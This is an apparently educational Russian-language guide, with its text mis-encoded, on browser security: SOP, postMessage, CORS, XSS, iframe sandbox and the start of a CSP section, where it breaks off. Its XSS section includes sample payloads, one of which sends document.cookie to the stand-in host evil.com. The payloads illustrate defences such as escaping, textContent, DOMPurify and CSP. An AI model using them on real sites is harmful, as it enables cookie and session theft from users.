## üîé –ù–∞–≤–∏–≥–∞—Ü–∏—è –ø–æ —Ä–∞–∑–¥–µ–ª–∞–º

1. [üîê Same-Origin Policy (SOP)](#sop)
2. [üì¨ –ú–µ—Ç–æ–¥ postMessage](#postmessage)
3. [üîê CORS (Cross-Origin Resource Sharing)](#cors)
4. [üî• XSS (Cross-Site Scripting)](#xss)
5. [üí£ CSRF (Cross-Site Request Forgery)](#csrf)
6. [üß± –ê—Ç—Ä–∏–±—É—Ç sandbox](#sandbox)
7. [üîê CSP (Content Security Policy)](#csp)
8. [üß© –°—Ä–∞–≤–Ω–µ–Ω–∏–µ XSS –∏ CSRF](#xss-vs-csrf)

## <a name="sop"></a> üîê Same-Origin Policy (SOP)

SOP (–ü–æ–ª–∏—Ç–∏–∫–∞ –æ–¥–Ω–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞) ‚Äî —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–π –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç, –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç—ã –∏–ª–∏ —Å–∫—Ä–∏–ø—Ç—ã,
–∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ –∏–∑ –æ–¥–Ω–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞, –º–æ–≥—É—Ç –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å —Ä–µ—Å—É—Ä—Å–∞–º–∏ –∏–∑ –¥—Ä—É–≥–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞.

üìå –ß—Ç–æ —Å—á–∏—Ç–∞–µ—Ç—Å—è –æ–¥–Ω–∏–º –∏—Å—Ç–æ—á–Ω–∏–∫–æ–º?

–ò—Å—Ç–æ—á–Ω–∏–∫ (origin) —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ —Ç—Ä—ë—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤:

* Scheme (–ø—Ä–æ—Ç–æ–∫–æ–ª): http / https;
* Host (–¥–æ–º–µ–Ω): example.com / api.example.com;
* Port (–ø–æ—Ä—Ç): 80, 443, 3000, –∏ —Ç.–¥.

‚û°Ô∏è –î–≤–∞ URL —Å—á–∏—Ç–∞—é—Ç—Å—è –æ–¥–Ω–æ–≥–æ origin, —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –í–°–ï —Ç—Ä–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ —Å–æ–≤–ø–∞–¥–∞—é—Ç.

üß± –ß—Ç–æ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç SOP?

SOP –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫:

* DOM-—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –¥—Ä—É–≥–∏—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä, iframe).
* Cookies, localStorage, sessionStorage.
* AJAX/fetch –∑–∞–ø—Ä–æ—Å–∞–º –∫ –¥—Ä—É–≥–∏–º origin (–µ—Å–ª–∏ –Ω–µ—Ç CORS).

üóÇÔ∏è –ü—Ä–∏–º–µ—Ä—ã —Ä–∞–±–æ—Ç—ã SOP

1. DOM-–¥–æ—Å—Ç—É–ø –∫ iframe

```html

<iframe src="https://other-domain.com"></iframe>
<script>
    const frame = document.querySelector("iframe");
    console.log(frame.contentWindow.document); // ‚ùå –û—à–∏–±–∫–∞ –∏–∑-–∑–∞ SOP
</script>
```

üö® –ü–æ—á–µ–º—É —ç—Ç–æ –≤–∞–∂–Ω–æ?

–ë–µ–∑ SOP –ª—é–±–æ–π —Å–∞–π—Ç –º–æ–≥ –±—ã:

* –ß–∏—Ç–∞—Ç—å –≤–∞—à—É –ø–æ—á—Ç—É –∏–∑ mail.google.com
* –ü–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω –∏–∑ localStorage –¥—Ä—É–≥–æ–≥–æ —Å–∞–π—Ç–∞
* –ü–æ–¥–¥–µ–ª–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏—è –æ—Ç –≤–∞—à–µ–≥–æ –∏–º–µ–Ω–∏ (CSRF)

‚úÖ –ö–∞–∫ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –º–µ–∂–¥—É –∏—Å—Ç–æ—á–Ω–∏–∫–∞–º–∏:

* CORS (Cross-Origin Resource Sharing) ‚Äî —Å–µ—Ä–≤–µ—Ä –¥–æ–ª–∂–µ–Ω —è–≤–Ω–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø
* postMessage ‚Äî –±–µ–∑–æ–ø–∞—Å–Ω–∞—è –ø–µ—Ä–µ–¥–∞—á–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –º–µ–∂–¥—É –æ–∫–Ω–∞–º–∏/iframes

---

üéØ –ó–∞—á–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è document.domain

–ß—Ç–æ–±—ã —Ä–∞–∑—Ä–µ—à–∏—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ –º–µ–∂–¥—É —Å—Ç—Ä–∞–Ω–∏—Ü–∞–º–∏ –∏–∑ –æ–¥–Ω–æ–≥–æ ‚Äú–æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–æ–Ω–Ω–æ–≥–æ –¥–æ–º–µ–Ω–∞‚Äù, –Ω–∞–ø—Ä–∏–º–µ—Ä:

`
admin.example.com
shop.example.com
`

‚û°Ô∏è –û–Ω–∏ –º–æ–≥—É—Ç —Å–æ–≥–ª–∞—Å–æ–≤–∞–Ω–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å document.domain = "example.com"
–∏ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ DOM –¥—Ä—É–≥ –¥—Ä—É–≥–∞.

üö´ –ü–æ—á–µ–º—É `document.domain` –±–æ–ª—å—à–µ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é—Ç?

* –≠—Ç–æ —É—Å—Ç–∞—Ä–µ–≤–∞—é—â–∏–π –º–µ—Ö–∞–Ω–∏–∑–º, –Ω–µ—Å–æ–≤–º–µ—Å—Ç–∏–º—ã–π —Å —Å—Ç—Ä–æ–≥–∏–º CSP, sandbox –≤ iframe.
* –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —Ä–∞—Å—à–∏—Ä—è–µ—Ç –∞—Ç–∞–∫—É—é—â—É—é –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç—å.

üîí –°–æ–≤—Ä–µ–º–µ–Ω–Ω–∞—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ ‚Äî postMessage.

---

## <a name="postmessage"></a> üì¨ –ß—Ç–æ —Ç–∞–∫–æ–µ `postMessage`

–ú–µ—Ç–æ–¥ `window.postMessage` –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–¥–Ω–æ–º—É –æ–∫–Ω—É –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –¥—Ä—É–≥–æ–º—É –æ–∫–Ω—É, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω–∏ –∏–∑ —Ä–∞–∑–Ω—ã—Ö origin. –≠—Ç–æ
–±–µ–∑–æ–ø–∞—Å–Ω—ã–π —Å–ø–æ—Å–æ–± –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –º–µ–∂–¥—É:

* –†–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–º –æ–∫–Ω–æ–º –∏ `iframe`
* –î–≤—É–º—è —Ä–∞–∑–Ω—ã–º–∏ –≤–∫–ª–∞–¥–∫–∞–º–∏
* –û–∫–Ω–æ–º –∏ –ø–æ–ø–∞–ø–æ–º (—á–µ—Ä–µ–∑ window.open)

```html
<!-- –†–û–î–ò–¢–ï–õ–¨ -->
<iframe src="https://child.com" id="child"></iframe>
<script>
    const iframe = document.getElementById('child');

    // –î–æ–∂–∏–¥–∞–µ–º—Å—è –∑–∞–≥—Ä—É–∑–∫–∏ iframe:
    iframe.onload = () => {
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤–æ —Ñ—Ä–µ–π–º:
        iframe.contentWindow.postMessage({type: 'ping'}, 'https://child.com');
        // üö® –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û —É–∫–∞–∑—ã–≤–∞–µ–º origin –ø–æ–ª—É—á–∞—Ç–µ–ª—è,
    };


    // –ü–æ–ª—É—á–∞–µ–º –æ—Ç–≤–µ—Ç –æ—Ç —Ñ—Ä–µ–π–º–∞:
    window.addEventListener('message', (event) => {
        // üö® –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –ø—Ä–æ–≤–µ—Ä—è–µ–º –∏—Å—Ç–æ—á–Ω–∏–∫
        if (event.origin !== 'https://child.com') return;

        // üö® –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –≤–∞–ª–∏–¥–∞—Ü–∏—è —Å—Ö–µ–º—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, —Å zod –∏–ª–∏ ajv)
        console.log('–û—Ç–≤–µ—Ç –æ—Ç iframe:', event.data);
    });
</script>

<!-- –†–ï–ë–ï–ù–û–ö -->
<script>
    window.addEventListener('message', (event) => {
        // üö® –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –ø—Ä–æ–≤–µ—Ä—è–µ–º –∏—Å—Ç–æ—á–Ω–∏–∫
        if (event.origin !== 'https://parent.com') return;

        // üö® –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –≤–∞–ª–∏–¥–∞—Ü–∏—è —Å—Ö–µ–º—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, —Å zod –∏–ª–∏ ajv)
        console.log('–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç —Ä–æ–¥–∏—Ç–µ–ª—è:', event.data);

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–æ–¥–∏—Ç–µ–ª—é:
        event.source.postMessage({type: 'pong'}, event.origin);
    });
</script>
```

üîé –ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è `postMessage` –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö –ø—Ä–æ–µ–∫—Ç–∞—Ö?

* –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ OAuth2 (popup –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ç–æ–∫–µ–Ω —Ä–æ–¥–∏—Ç–µ–ª—é)
* –í–∏–¥–∂–µ—Ç—ã —Å iframe (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á–∞—Ç, –ø–ª–∞—Ç—ë–∂–Ω—ã–µ —Ñ–æ—Ä–º—ã)
* –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ –º–µ–∂–¥—É –º–∏–∫—Ä–æ—Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–∞–º–∏
* –†–∞—Å—à–∏—Ä–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞

---

## <a name="cors"></a> üîê –ß—Ç–æ —Ç–∞–∫–æ–µ CORS?

CORS (Cross-Origin Resource Sharing) ‚Äî —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–µ—Ä–≤–µ—Ä—É —è–≤–Ω–æ —É–∫–∞–∑–∞—Ç—å, –∫–∞–∫–∏–º –¥—Ä—É–≥–∏–º –∏—Å—Ç–æ—á–Ω–∏–∫–∞–º (
origin) –º–æ–∂–Ω–æ –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ –µ–≥–æ —Ä–µ—Å—É—Ä—Å–∞–º —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä.

üëâ –ë–µ–∑ CORS –±—Ä–∞—É–∑–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä—É–µ—Ç –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∑–∞–ø—Ä–æ—Å –∫ —Ä–µ—Å—É—Ä—Å—É —Å –¥—Ä—É–≥–æ–≥–æ origin, –¥–∞–∂–µ –µ—Å–ª–∏ —Å–µ—Ä–≤–µ—Ä –æ—Ç–≤–µ—Ç–∏–ª 200 OK.

üìå –ö–æ–≥–¥–∞ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç "–∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω—ã–π" –∑–∞–ø—Ä–æ—Å?

–ö–æ–≥–¥–∞ –∏—Å—Ç–æ—á–Ω–∏–∫ (origin) –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è –∏ –ø–æ–ª—É—á–∞—Ç–µ–ª—è –æ—Ç–ª–∏—á–∞—é—Ç—Å—è —Ö–æ—Ç—è –±—ã –ø–æ –æ–¥–Ω–æ–º—É –∏–∑ 3 –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤:

* Scheme (–ø—Ä–æ—Ç–æ–∫–æ–ª): http / https
* Host (–¥–æ–º–µ–Ω): example.com / api.example.com
* Port (–ø–æ—Ä—Ç): 80, 443, 3000, –∏ —Ç.–¥.

üîπ –ö–ª—é—á–µ–≤–æ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫: Access-Control-Allow-Origin

```
Access-Control-Allow-Origin: https://frontend.com
```

üí° –í–∏–¥—ã CORS-–∑–∞–ø—Ä–æ—Å–æ–≤:

1. –ü—Ä–æ—Å—Ç–æ–π (simple request)

* –ú–µ—Ç–æ–¥—ã: GET, POST, HEAD
* –ó–∞–≥–æ–ª–æ–≤–∫–∏: —Ç–æ–ª—å–∫–æ Accept, Content-Type (–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è), User-Agent –∏ –¥—Ä.

üëâ –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é, –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞

2. –ü—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã–π (preflight request)

* –ú–µ—Ç–æ–¥: PUT, DELETE, PATCH, –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ POST
* –ó–∞–≥–æ–ª–æ–≤–∫–∏: –∫–∞—Å—Ç–æ–º–Ω—ã–µ (Authorization, X-Token, –∏ —Ç.–ø.)
* Content-Type: application/json ‚Äî —É–∂–µ –≤—ã–∑—ã–≤–∞–µ—Ç preflight!
* –ë—Ä–∞—É–∑–µ—Ä —Å–Ω–∞—á–∞–ª–∞ –¥–µ–ª–∞–µ—Ç OPTIONS-–∑–∞–ø—Ä–æ—Å (preflight), —á—Ç–æ–±—ã —Å–ø—Ä–æ—Å–∏—Ç—å —É —Å–µ—Ä–≤–µ—Ä–∞: ¬´–∞ –º–æ–∂–Ω–æ?¬ª

–ü—Ä–∏–º–µ—Ä –∑–∞–ø—Ä–æ—Å–∞:

```
OPTIONS /data HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```

–ò —Å–µ—Ä–≤–µ—Ä –¥–æ–ª–∂–µ–Ω –æ—Ç–≤–µ—Ç–∏—Ç—å:

```
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Authorization
```

–î—Ä—É–≥–∏–µ –≤–∞–∂–Ω—ã–µ CORS-–∑–∞–≥–æ–ª–æ–≤–∫–∏

| –ó–∞–≥–æ–ª–æ–≤–æ–∫                          | –û–ø–∏—Å–∞–Ω–∏–µ                                      |
|------------------------------------|-----------------------------------------------|
| `Access-Control-Allow-Origin`      | –†–∞–∑—Ä–µ—à—ë–Ω–Ω—ã–π origin                            |
| `Access-Control-Allow-Methods`     | –†–∞–∑—Ä–µ—à—ë–Ω–Ω—ã–µ HTTP-–º–µ—Ç–æ–¥—ã                       |
| `Access-Control-Allow-Headers`     | –†–∞–∑—Ä–µ—à—ë–Ω–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏                         |
| `Access-Control-Allow-Credentials` | –†–∞–∑—Ä–µ—à–µ–Ω—ã –ª–∏ –∫—É–∫–∏ (—Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ origin –ù–ï `*`) |
| `Access-Control-Expose-Headers`    | –ö–∞–∫–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–æ—Å—Ç—É–ø–Ω—ã –∫–ª–∏–µ–Ω—Ç—É              |
| `Access-Control-Max-Age`           | –ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ preflight-–∑–∞–ø—Ä–æ—Å–∞                 |

üç™ CORS –∏ –∫—É–∫–∏ (credentials)

* –ù–∞ –∫–ª–∏–µ–Ω—Ç–µ:

```js
fetch("https://api.example.com/data", {
    credentials: "include"
})
```

* –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ:

```
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Credentials: true
```

‚ùó –ù–µ–ª—å–∑—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å * —Å Allow-Credentials: true!

---

## <a name="xss"></a> üî• –ß—Ç–æ —Ç–∞–∫–æ–µ XSS?

XSS (Cross-Site Scripting) ‚Äî —ç—Ç–æ –∞—Ç–∞–∫–∞, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä—è–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript-–∫–æ–¥ –≤ –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É,
–∫–æ—Ç–æ—Ä—ã–π –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.

–¶–µ–ª—å XSS ‚Äî –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–≤–æ–π JS –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ —Å–∞–π—Ç–∞, —á—Ç–æ–±—ã:

* —É–∫—Ä–∞—Å—Ç—å cookies / —Ç–æ–∫–µ–Ω—ã
* –ø–æ–¥–º–µ–Ω–∏—Ç—å DOM
* —Å–¥–µ–ª–∞—Ç—å —Ñ–∏—à–∏–Ω–≥
* –≤—ã–ø–æ–ª–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏—è –æ—Ç –ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

üß® –í–∏–¥—ã XSS

1. Reflected XSS (–æ—Ç—Ä–∞–∂—ë–Ω–Ω—ã–π)

* –°–∫—Ä–∏–ø—Ç –ø–µ—Ä–µ–¥–∞—ë—Ç—Å—è —á–µ—Ä–µ–∑ URL –∏–ª–∏ —Ñ–æ—Ä–º—É.
* –û—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ —Å—Ä–∞–∑—É (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ –æ—Ç–≤–µ—Ç–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞).

```
https://site.com/search?q=<script>alert(1)</script>
```

2. Stored XSS (—Å–æ—Ö—Ä–∞–Ω—è–µ–º—ã–π)

* –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ (–≤ –±–∞–∑–µ, –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è—Ö, –∏ —Ç.–ø.).
* –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É –≤—Å–µ—Ö, –∫—Ç–æ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –∑–∞—Ä–∞–∂—ë–Ω–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É.

```html
<!-- –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –æ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
```

3. DOM-based XSS

* –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –≤ JS-–∫–æ–¥–µ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
* –ù–µ—Ç —É—á–∞—Å—Ç–∏—è —Å–µ—Ä–≤–µ—Ä–∞ ‚Äî –≤—Å—è –ª–æ–≥–∏–∫–∞ –≤ DOM/JS

```js
// üö® –û–ø–∞—Å–Ω–æ: –≤—Å—Ç–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ location.hash –±–µ–∑ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏
document.getElementById("output").innerHTML = location.hash; // ‚ùå XSS

// –†–µ—à–µ–Ω–∏–µ:
document.getElementById("output").textContent = location.hash; // ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ:
```

üîí –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è –æ—Ç XSS

üîπ 1. –≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ HTML

–ù–∏–∫–æ–≥–¥–∞ –Ω–µ –≤—Å—Ç–∞–≤–ª—è–π "—Å—ã—Ä—ã–µ" –¥–∞–Ω–Ω—ã–µ –≤ innerHTML, –µ—Å–ª–∏ –Ω–µ –ø—Ä–æ—à–ª–∏ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—é

üîπ 2. –ò—Å–ø–æ–ª—å–∑—É–π –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –º–µ—Ç–æ–¥—ã –≤—Å—Ç–∞–≤–∫–∏

| –û–ø–∞—Å–Ω–æ                              | –ë–µ–∑–æ–ø–∞—Å–Ω–æ                    |
|-------------------------------------|------------------------------|
| `innerHTML`                         | `textContent`                |
| `document.write`                    | `createTextNode`             |
| `dangerouslySetInnerHTML` (–≤ React) | JSX (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –±–µ–∑–æ–ø–∞—Å–µ–Ω) |

üîπ 3. Content Security Policy (CSP)

–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø—Ä–∞–≤–∏–ª–∞, –æ—Ç–∫—É–¥–∞ –º–æ–∂–Ω–æ –∑–∞–≥—Ä—É–∂–∞—Ç—å —Å–∫—Ä–∏–ø—Ç—ã

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

üîπ 4. –°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è (–æ—á–∏—Å—Ç–∫–∞) –¥–∞–Ω–Ω—ã—Ö

–ò—Å–ø–æ–ª—å–∑—É–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏: DOMPurify, sanitize-html

```js
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);
```

üí• –ü—Ä–∏–º–µ—Ä DOM-based XSS

```html

<script>
    const hash = location.hash;
    document.getElementById("output").innerHTML = hash; // ‚ùå XSS
</script>
```

---

## <a name="sandbox"></a> üß± –ß—Ç–æ —Ç–∞–∫–æ–µ sandbox?

`sandbox` ‚Äî —ç—Ç–æ –∞—Ç—Ä–∏–±—É—Ç HTML-—Ç–µ–≥–∞ `iframe`, –∫–æ—Ç–æ—Ä—ã–π –≤–∫–ª—é—á–∞–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –≤–Ω—É—Ç—Ä–∏ iframe.

```html

<iframe src="https://untrusted.com" sandbox></iframe>
```

üìå –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ sandbox –∑–∞–ø—Ä–µ—â–∞–µ—Ç:

* –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–æ–≤
* –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–æ—Ä–º
* –æ—Ç–∫—Ä—ã—Ç–∏–µ –Ω–æ–≤—ã—Ö –æ–∫–æ–Ω
* –¥–æ—Å—Ç—É–ø –∫ top/parent
* –∑–∞–ø—É—Å–∫ –ø–ª–∞–≥–∏–Ω–æ–≤
* –∏–∑–º–µ–Ω–µ–Ω–∏–µ URL
* –∏ –¥—Ä.

–≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è, –Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–ª—è —Ä–µ–∫–ª–∞–º—ã, –Ω–µ–¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ –∏ —Ç–µ—Å—Ç–æ–≤.

üß† –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç sandbox –ø–æ–¥ –∫–∞–ø–æ—Ç–æ–º

* iframe –ø–æ–ª—É—á–∞–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–µ –ø—Ä–∞–≤–∞ –≤ JavaScript API
* –ï–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–º (–≤–æ–∑–º–æ–∂–Ω–æ ‚Äî –¥—Ä—É–≥–æ–π origin)
* –ë—Ä–∞—É–∑–µ—Ä –±–ª–æ–∫–∏—Ä—É–µ—Ç –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø–∞—Å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω–∏ –¥–æ–ø—É—Å—Ç–∏–º—ã –Ω–∞ –æ–±—ã—á–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ

üìö –ü–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Ñ–ª–∞–≥–æ–≤ sandbox

| –§–ª–∞–≥                             | –ß—Ç–æ —Ä–∞–∑—Ä–µ—à–∞–µ—Ç                                                   |
|----------------------------------|-----------------------------------------------------------------|
| `allow-scripts`                  | –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ JS –≤–Ω—É—Ç—Ä–∏ iframe                                     |
| `allow-same-origin`              | –°—á–∏—Ç–∞—Ç—å iframe —Ç–µ–º –∂–µ origin (–∏–Ω–∞—á–µ –æ–Ω —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è "–ø–µ—Å–æ—á–Ω–∏—Ü–µ–π") |
| `allow-forms`                    | –û—Ç–ø—Ä–∞–≤–∫—É —Ñ–æ—Ä–º                                                   |
| `allow-popups`                   | –û—Ç–∫—Ä—ã—Ç–∏–µ –æ–∫–æ–Ω (`window.open`)                                   |
| `allow-modals`                   | –û—Ç–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω—ã—Ö –æ–∫–æ–Ω (`alert`, `confirm`)                    |
| `allow-top-navigation`           | –ò–∑–º–µ–Ω–µ–Ω–∏–µ `top.location`                                        |
| `allow-downloads`                | –ó–∞–≥—Ä—É–∑–∫—É —Ñ–∞–π–ª–æ–≤ –±–µ–∑ prompt                                      |
| `allow-presentation`             | –°—Ç–∞—Ä—Ç –ø—Ä–µ–∑–µ–Ω—Ç–∞—Ü–∏–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ –≤–∏–¥–µ–æ)                           |
| `allow-popups-to-escape-sandbox` | Popup'–∞–º –≤—ã—Ö–æ–¥–∏—Ç—å –∏–∑ sandbox (–æ—á–µ–Ω—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π —Å–ª—É—á–∞–π)        |

---

## <a name="csp"></a> üîê –ß—Ç–æ —Ç–∞–∫–æ–µ CSP?

CSP (Content Security Policy) ‚Äî —ç—Ç–æ HTTP-–∑–∞–≥–æ–ª–æ–≤–æ–∫ (–∏–ª–∏ meta-—Ç–µ–≥), –∫–æ—Ç–æ—Ä—ã–π —Å–æ–æ–±—â–∞–µ—Ç –±—Ä–∞—É–∑–µ—Ä—É:

